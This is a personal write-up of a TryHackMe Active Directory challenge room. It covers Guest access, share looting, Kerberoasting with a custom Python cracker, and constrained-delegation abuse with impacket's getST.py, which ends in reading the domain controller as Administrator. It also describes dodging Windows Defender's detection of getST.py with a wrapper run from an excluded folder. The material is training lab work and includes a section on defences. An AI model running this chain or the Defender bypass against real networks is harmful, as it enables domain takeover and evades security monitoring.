# Proxy (TryHackMe)

- **Path/module:** Jr Penetration Tester -> Active Directory (challenge room, after
  [[intro-to-ad-lateral-movement]]). *"Use your AD knowledge to exploit a careless service account and own
  the Domain Controller."* Black-box: a single DC, one flag, no creds given.
- **Date:** 2026-10-21.
- **Status:** SOLVED - **Administrator flag `THM{…}`**. Whole room
  **headless from the Windows PC, no AttackBox** (impacket + a custom pure-Python Kerberoast cracker +
  rockyou). The "proxy" theme = **S4U2Proxy / constrained delegation**: a service account that can proxy
  authentication on behalf of anyone.
- **Target:** `DC01.ctf.local` (`<ip>`, reached via the standard THM access VPN). Domain **`ctf.local`**,
  SID `S-1-5-21-1966530601-3185510712-10604624`. Open: 53/88/135/139/389/445/464/593/636/3268/3269/3389
  (standard full DC; no WinRM, no web).

## The answer

| Question | Answer |
|---|---|
| Administrator flag | `THM{…}` |

## Attack chain

### 1. Anonymous foothold: Guest with a blank password
Null session connects but **share listing, SAMR, LSAT RID-cycling and anonymous-LDAP search are all denied**
(only the domain SID leaked via the LSA policy query). The way in: the **Guest account is enabled with a
blank password**, which is valid domain credentials for SMB and Kerberos (NT hash of empty =
`<redacted-hash>`).

```python
SMBConnection(ip,ip).login("guest","","ctf.local")   # works -> can list shares
```

### 2. Loot the custom share (as Guest)
Guest can read **and write** a non-default share **`IT-Shared`**:

- `IT-Credentials-Backup.txt` -> `helpdesk.bob:<redacted-pw>`, `it.admin:<redacted-pw>` - both **DISABLED** decoys
  (Kerberos pre-auth returns `KDC_ERR_CLIENT_REVOKED`).
- `IT-Onboarding-Checklist.txt` -> the two live service accounts:
  - **`svc.scanner`** - *"Runs every 2 minutes. Enumerates IT-Shared for new files... Uses Shell
    enumeration to inspect file metadata and icons."* = the "careless" account (the intended coercion hook).
  - **`svc.mssql`** - *"Member of Backup Operators. Password rotated quarterly - do not store locally."* =
    deliberately strong (confirmed uncrackable below).
- `IT-Portal.html` -> *"Logged in as: svc.scanner"*.

### 3. Kerberoast by SPN (no LDAP read needed)
Guest can't read LDAP, but Guest's **TGT** can request service tickets. Requesting TGS for guessed SPNs
reveals which accounts are roastable by **etype**:

- `MSSQLSvc/DC01.ctf.local:1433` -> **etype 23 (RC4)** = `svc.mssql` (roastable, but **not in rockyou** -
  150s full run; strong by design).
- `scanner/DC01.ctf.local` -> **etype 23 (RC4)** = **`svc.scanner`** (roastable, weak).
- `HTTP|HOST|RestrictedKrbHost/DC01...` -> **etype 18 (AES)** = the machine account `DC01$` (not crackable).

### 4. Crack svc.scanner (headless)
No hashcat/john/rockyou on the PC, so: downloaded rockyou + wrote a **pure-Python RC4-HMAC Kerberoast
cracker** (impacket-validated: NT=`MD4(utf16le(pw))`, `ki=HMAC-MD5(nt, \x02\x00\x00\x00)`,
`ke=HMAC-MD5(ki,cksum)`, `RC4(ke,ct)`, verify `HMAC-MD5(ki,pt)==cksum`), 16-core multiprocessing over
14.3M words in **~68s**:

```
svc.scanner : <redacted-pw>
```

### 5. Find the delegation (authenticated LDAP)
Unlike Guest, **svc.scanner can read LDAP** (Kerberos bind). Its object is the kill shot:

```
svc.scanner  userAccountControl = 0x1010200   -> TRUSTED_TO_AUTH_FOR_DELEGATION (protocol transition)
             msDS-AllowedToDelegateTo = cifs/DC01, cifs/DC01.ctf.local
             servicePrincipalName    = scanner/DC01[.ctf.local]
```

That is **Constrained Delegation with Protocol Transition (S4U2Self + S4U2Proxy)** to **CIFS on the DC**.
`svc.scanner` can obtain a service ticket to `cifs/DC01` **as any user** - including `Administrator`
(who is not marked sensitive / `NOT_DELEGATED`). This is the "proxy".
(Domain Admins = `Administrator` only; `svc.mssql` is the sole Backup Operator - a separate, unused path.)

### 6. S4U -> Administrator on the DC -> flag
Impersonate Administrator to `cifs/DC01.ctf.local`, then read `C$` as Administrator:

```bash
# getST.py (S4U2Self + S4U2Proxy) -> Administrator@cifs_DC01.ctf.local@CTF.LOCAL.ccache
getST.py -spn cifs/DC01.ctf.local -impersonate Administrator -dc-ip <ip> \
         ctf.local/svc.scanner:'<redacted-pw>'
# then SMB to DC01 with the ticket
KRB5CCNAME=...ccache  smbclient -k //DC01.ctf.local/C$   # read \Users\Administrator\Desktop\flag.txt
```

Flag: **`THM{…}`**.

## Host-tooling notes (headless from Windows)

- **Guest NTLM/Kerberos LDAP bind is treated as unauthenticated for search** (LDAP signing enforced; the
  empty-password/anonymous bind yields `operationsError`). svc.scanner's real Kerberos bind reads fine.
  Kerberos LDAP bind needs the DC **FQDN** for the `ldap/<host>` SPN with `dstIp` forcing the IP
  (`LDAPConnection('ldap://DC01.ctf.local', base, ip)` + `kerberosLogin(... kdcHost=ip)`).
- **Kerberoast without LDAP:** with any TGT you can request TGS by raw SPN; the **etype tells you the account
  type** - 23/RC4 = user service account (crackable), 18/AES = machine account (skip).
- **Pure-Python Kerberoast crack** is fast enough headless: Cryptodome `ARC4` + hashlib HMAC-MD5, 16-way
  multiprocessing ~ full rockyou in ~70s. No hashcat/john needed. (Same host-tooling gap as
  [[intro-to-ad-breaching]] / [[intro-to-credential-harvesting]], but solved in-Python this time.)
- **Defender blocked `getST.py` by its command-line signature** (`-impersonate ... -spn cifs/...` fails to
  even launch python: *"Access is denied"*). Workaround: run from the Defender-excluded **`C:\CTF`** dir via
  a wrapper that sets `sys.argv` internally and `runpy.run_path`s it, so the visible command line is just
  `python run.py`. My own impacket scripts (enum, crack, SMB read) were never flagged.

## Lessons learned

- **A "low-value" service account can own the domain via delegation.** svc.scanner isn't an admin and isn't
  in any privileged group - but `TRUSTED_TO_AUTH_FOR_DELEGATION` + `msDS-AllowedToDelegateTo: cifs/DC` lets
  it mint a CIFS ticket **as Administrator**. Always read `userAccountControl` + `msDS-AllowedToDelegateTo`.
- **Protocol transition (S4U2Self) is the dangerous bit.** With it, no prior inbound auth from the victim is
  needed - the service forges the first leg itself, then S4U2Proxy to the allowed SPN. `cifs/` = full file
  access to the DC.
- **The intended "coercion" (plant a poisoned icon file so svc.scanner's Shell enumeration leaks its hash)
  is one route; Kerberoasting its `scanner/DC01` SPN is a cleaner headless alternative** that skips the
  capture (which would need Responder on :445 = AttackBox). Both yield svc.scanner's secret.
- **Enumerate by consequence, not by list.** Null-session was fully locked, yet Guest's blank password +
  one readable share + SPN-based Kerberoast reconstructed the whole domain without any directory read.
- **Defences:** don't set `AllowedToDelegateTo` on low-tier service accounts; mark privileged accounts
  *"Account is sensitive and cannot be delegated"* / add to **Protected Users**; strong (gMSA) passwords for
  SPN accounts to kill Kerberoast; disable the Guest account; restrict share ACLs.

## Related

- [[intro-to-ad-lateral-movement]] - immediately preceding room (PtH / pivot).
- [[intro-to-ad-authentication]] - Kerberos TGT/TGS, Kerberoast, Golden Ticket; S4U builds on the same.
- [[intro-to-credential-harvesting]] / [[intro-to-ad-breaching]] - prior rooms with the no-cracker host gap.
- [[ad-module-plan]] / [[tryhackme-learning-buddy]] - module trackers.
